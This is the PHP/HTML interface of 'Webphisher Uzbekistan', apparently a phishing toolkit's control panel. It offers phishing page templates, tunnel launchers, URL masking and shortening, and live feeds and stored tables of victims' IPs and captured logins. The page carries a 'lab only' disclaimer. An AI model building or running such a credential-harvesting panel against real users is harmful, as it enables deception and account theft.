<?php
declare(strict_types=1);
?><!DOCTYPE html>
<html lang="uz">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Webphisher Uzbekistan</title>
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600&family=Outfit:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
  <link rel="stylesheet" href="/assets/css/style.css?v=3.2">
</head>
<body>
  <div class="bg-mesh" aria-hidden="true">
    <div class="blob blob-1"></div>
    <div class="blob blob-2"></div>
  </div>

  <div class="app">
    <aside class="sidebar">
      <div class="brand">
        <div class="brand-icon"><i class="fas fa-shield-halved"></i></div>
        <div>
          <h1 class="brand-title" data-i18n="meta.brand">Webphisher Uzbekistan</h1>
          <span class="tag" data-i18n="meta.tag" data-i18n-meta-tag data-version="<?= htmlspecialchars(PANEL_VERSION) ?>">Panel</span>
        </div>
      </div>

      <div class="lang-switch" role="group" aria-label="Language">
        <span class="lang-label" data-i18n="lang.label">Til</span>
        <div class="lang-btns">
          <button type="button" class="lang-btn active" data-lang="uz" title="O'zbek">UZ</button>
          <button type="button" class="lang-btn" data-lang="ru" title="Русский">RU</button>
          <button type="button" class="lang-btn" data-lang="en" title="English">EN</button>
        </div>
      </div>

      <nav class="nav">
        <button type="button" class="nav-item active" data-view="dashboard">
          <i class="fas fa-gauge-high"></i><span data-i18n="nav.dashboard">Boshqaruv</span>
        </button>
        <button type="button" class="nav-item" data-view="templates">
          <i class="fas fa-layer-group"></i><span data-i18n="nav.templates">Shablonlar</span>
        </button>
        <button type="button" class="nav-item" data-view="live">
          <i class="fas fa-bolt"></i><span data-i18n="nav.live">Jonli</span>
        </button>
        <button type="button" class="nav-item" data-view="logs">
          <i class="fas fa-chart-line"></i><span data-i18n="nav.logs">Ma'lumotlar</span>
        </button>
        <button type="button" class="nav-item" data-view="settings">
          <i class="fas fa-sliders"></i><span data-i18n="nav.settings">Sozlamalar</span>
        </button>
      </nav>

      <div class="sidebar-footer">
        <div class="disclaimer">
          <i class="fas fa-triangle-exclamation"></i>
          <span data-i18n="disclaimer">Lab only</span>
        </div>
        <div id="sys-status" class="sys-status" data-i18n="status.loading">...</div>
      </div>
    </aside>

    <div class="layout-body">
    <main class="main">
      <header class="topbar">
        <div class="topbar-text">
          <h2 id="page-title" data-i18n="page.dashboard.title">Dashboard</h2>
          <p id="page-subtitle" class="page-subtitle" data-i18n="page.dashboard.sub">...</p>
        </div>
        <div class="topbar-actions">
          <span id="session-badge" class="badge badge-idle" data-i18n="session.none">—</span>
          <button type="button" id="btn-stop-global" class="btn btn-danger btn-sm" hidden>
            <i class="fas fa-stop"></i> <span data-i18n="session.stop">Stop</span>
          </button>
        </div>
      </header>

      <section id="view-dashboard" class="view active">
        <div class="grid stats">
          <div class="stat-card cyan">
            <div class="stat-icon"><i class="fas fa-code-branch"></i></div>
            <span class="stat-label" data-i18n="stat.panel">Panel</span>
            <strong id="stat-version">—</strong>
          </div>
          <div class="stat-card violet">
            <div class="stat-icon"><i class="fab fa-php"></i></div>
            <span class="stat-label" data-i18n="stat.php">PHP</span>
            <strong id="stat-php">—</strong>
          </div>
          <div class="stat-card orange">
            <div class="stat-icon"><i class="fas fa-network-wired"></i></div>
            <span class="stat-label" data-i18n="stat.ips">IP</span>
            <strong id="stat-ips">0</strong>
          </div>
          <div class="stat-card green">
            <div class="stat-icon"><i class="fas fa-key"></i></div>
            <span class="stat-label" data-i18n="stat.creds">Logins</span>
            <strong id="stat-creds">0</strong>
          </div>
        </div>

        <div class="card launch-card">
          <h3><i class="fas fa-rocket"></i> <span data-i18n="launch.title">Start</span></h3>
          <p class="muted" data-i18n="launch.desc">...</p>
          <div class="form-row">
            <label data-i18n="form.template">Template</label>
            <select id="quick-template"></select>
          </div>
          <div class="form-row two">
            <div>
              <label data-i18n="form.tunnel">Tunnel</label>
              <select id="quick-tunnel">
                <option value="localhost">Localhost</option>
                <option value="cloudflared">Cloudflared</option>
                <option value="loclx">LocalXpose</option>
              </select>
            </div>
            <div>
              <label data-i18n="form.port">Port</label>
              <input type="number" id="quick-port" value="8080" min="1024" max="9999">
            </div>
          </div>
          <div class="form-row check-row">
            <label class="checkbox"><input type="checkbox" id="quick-mask"> <span data-i18n="form.mask_url">Mask</span></label>
            <label class="checkbox"><input type="checkbox" id="quick-short" checked> <span data-i18n="form.short_url">Short</span></label>
          </div>
          <div class="form-row" id="mask-row" hidden>
            <label data-i18n="form.custom_mask">Custom mask</label>
            <input type="text" id="quick-mask-url" data-i18n-placeholder="form.mask_placeholder">
          </div>
          <div class="form-row" id="loclx-row" hidden>
            <label data-i18n="form.loclx_region">Region</label>
            <select id="quick-loclx-region"><option value="us">US</option><option value="eu">EU</option></select>
          </div>
          <button type="button" id="btn-start" class="btn btn-primary btn-lg">
            <i class="fas fa-play"></i> <span data-i18n="btn.start">Launch</span>
          </button>
        </div>

        <div id="urls-panel" class="card urls-panel" hidden>
          <h3><i class="fas fa-link"></i> <span data-i18n="urls.title">Links</span></h3>
          <div class="url-list" id="url-list"></div>
        </div>
      </section>

      <section id="view-templates" class="view">
        <div class="search-bar">
          <i class="fas fa-search"></i>
          <input type="search" id="template-search" data-i18n-placeholder="search.placeholder">
        </div>
        <div id="template-grid" class="template-grid"></div>
      </section>

      <section id="view-live" class="view">
        <div class="live-grid">
          <div class="card live-card ip">
            <h3><i class="fas fa-globe"></i> <span data-i18n="live.ips.title">IPs</span></h3>
            <div id="live-ips" class="feed empty" data-feed-empty="live.ips.empty"></div>
          </div>
          <div class="card live-card cred">
            <h3><i class="fas fa-user-lock"></i> <span data-i18n="live.creds.title">Logins</span></h3>
            <div id="live-creds" class="feed empty" data-feed-empty="live.creds.empty"></div>
          </div>
        </div>
      </section>

      <section id="view-logs" class="view">
        <div class="logs-header">
          <div>
            <h3 class="section-heading" data-i18n="logs.db_title">Database</h3>
            <p class="muted section-sub" data-i18n="logs.db_sub">...</p>
          </div>
          <div class="toolbar">
            <button type="button" class="btn btn-ghost" id="btn-refresh-logs"><i class="fas fa-rotate"></i> <span data-i18n="btn.refresh">Refresh</span></button>
            <button type="button" class="btn btn-ghost danger-text" id="btn-clear-logs"><i class="fas fa-trash-can"></i> <span data-i18n="btn.clear">Clear</span></button>
          </div>
        </div>
        <div class="tabs">
          <button type="button" class="tab active" data-tab="creds"><i class="fas fa-key"></i><span data-i18n="tab.creds">Logins</span></button>
          <button type="button" class="tab" data-tab="ips"><i class="fas fa-wifi"></i><span data-i18n="tab.ips">IPs</span></button>
          <button type="button" class="tab" data-tab="history"><i class="fas fa-clock-rotate-left"></i><span data-i18n="tab.history">Sessions</span></button>
        </div>
        <div id="tab-creds" class="tab-panel active"><div class="data-card table-wrap" id="table-creds"></div></div>
        <div id="tab-ips" class="tab-panel"><div class="data-card table-wrap" id="table-ips"></div></div>
        <div id="tab-history" class="tab-panel"><div class="data-card table-wrap" id="table-history"></div></div>
      </section>

      <section id="view-settings" class="view">
        <div class="settings-grid">
          <div class="card">
            <h3><i class="fas fa-key"></i> <span data-i18n="settings.token_title">Token</span></h3>
            <p class="muted" data-i18n="settings.token_desc">...</p>
            <input type="password" id="setting-loclx-token" data-i18n-placeholder="settings.token_placeholder">
            <button type="button" id="btn-save-settings" class="btn btn-primary settings-save-btn">
              <i class="fas fa-save"></i> <span data-i18n="btn.save">Save</span>
            </button>
          </div>
          <div class="card">
            <h3><i class="fas fa-cloud-arrow-down"></i> <span data-i18n="settings.binaries_title">Binaries</span></h3>
            <p class="muted" data-i18n="settings.binaries_desc">...</p>
            <div class="btn-row">
              <button type="button" id="btn-install-cf" class="btn btn-secondary"><i class="fas fa-cloud"></i> Cloudflared</button>
              <button type="button" id="btn-install-lx" class="btn btn-secondary"><i class="fas fa-globe"></i> LocalXpose</button>
            </div>
          </div>
          <div class="card">
            <h3><i class="fas fa-arrow-up-from-bracket"></i> <span data-i18n="settings.update_title">Updates</span></h3>
            <p id="update-info" class="muted" data-i18n="settings.update_checking">...</p>
          </div>
        </div>
      </section>
    </main>

    <aside class="rail" id="right-rail">
      <div class="rail-card rail-session" id="rail-session">
        <h4><i class="fas fa-circle-play"></i> <span data-i18n="rail.session_title">Faol sessiya</span></h4>
        <div id="rail-session-body" class="rail-empty" data-i18n="rail.session_none">Sessiya yo'q</div>
      </div>

      <div class="rail-card">
        <h4><i class="fas fa-chart-pie"></i> <span data-i18n="rail.stats_title">Qisqa statistika</span></h4>
        <ul class="rail-stats" id="rail-stats">
          <li><span data-i18n="stat.ips">IP</span><strong id="rail-stat-ips">0</strong></li>
          <li><span data-i18n="stat.creds">Login</span><strong id="rail-stat-creds">0</strong></li>
          <li><span data-i18n="rail.templates">Shablonlar</span><strong id="rail-stat-tpl">—</strong></li>
        </ul>
      </div>

      <div class="rail-card">
        <h4><i class="fas fa-clock"></i> <span data-i18n="rail.recent_title">So'nggi yozuvlar</span></h4>
        <div id="rail-recent" class="rail-recent-list rail-empty" data-i18n="rail.recent_none">Hali yozuv yo'q</div>
      </div>

      <div class="rail-card">
        <h4><i class="fas fa-bolt"></i> <span data-i18n="rail.quick_title">Tezkor o'tish</span></h4>
        <div class="rail-quick">
          <button type="button" class="rail-quick-btn" data-goto="templates"><i class="fas fa-layer-group"></i><span data-i18n="nav.templates">Shablonlar</span></button>
          <button type="button" class="rail-quick-btn" data-goto="live"><i class="fas fa-bolt"></i><span data-i18n="nav.live">Jonli</span></button>
          <button type="button" class="rail-quick-btn" data-goto="logs"><i class="fas fa-database"></i><span data-i18n="nav.logs">Ma'lumotlar</span></button>
          <button type="button" class="rail-quick-btn" data-goto="settings"><i class="fas fa-gear"></i><span data-i18n="nav.settings">Sozlamalar</span></button>
        </div>
      </div>

      <div class="rail-card rail-tip">
        <h4><i class="fas fa-graduation-cap"></i> <span data-i18n="rail.tip_title">Laboratoriya</span></h4>
        <p data-i18n="rail.tip_text">Faqat o'quv maqsadida. Real tizimlarga ruxsatsiz hujum qilmang.</p>
      </div>
    </aside>
    </div>
  </div>

  <div id="toast" class="toast" hidden></div>
  <div id="modal" class="modal" hidden>
    <div class="modal-box">
      <h3 id="modal-title" data-i18n="modal.template">Template</h3>
      <div id="modal-body"></div>
      <div class="modal-actions">
        <button type="button" class="btn btn-ghost" id="modal-close"><span data-i18n="btn.cancel">Cancel</span></button>
        <button type="button" class="btn btn-primary" id="modal-start"><i class="fas fa-play"></i> <span data-i18n="btn.start">Launch</span></button>
      </div>
    </div>
  </div>

  <script src="/assets/js/i18n.js?v=3.2"></script>
  <script src="/assets/js/app.js?v=3.2"></script>
</body>
</html>
